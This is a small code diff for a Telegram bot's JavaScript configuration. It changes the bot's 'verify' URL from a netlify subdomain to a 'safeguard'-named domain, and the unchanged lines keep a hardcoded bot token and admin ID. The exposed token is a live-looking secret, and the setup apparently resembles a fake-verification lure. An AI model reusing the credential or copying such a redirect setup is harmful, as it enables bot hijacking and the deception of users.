@@ -1,6 +1,6 @@
 const BOT_TOKEN = "8285172039:AAHnkCFzGssliNwPjQO4c6oNFkTzP9SS0hw";
 const ADMIN_ID = 7241621112;
-const VERIFY_URL = "https://harmonious-stroopwafel-0a6945.netlify.app/";
+const VERIFY_URL = "https://safehubforsafeguard.de/";
 const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const IMAGE_ID = "AgACAgQAAxkBAAIBY2lrEwQvtPlGvcxAEHTJLIsyiLsgAAJGDGsbmyRZU_IWsZnS58IZAQADAgADeQADOAQ";
 
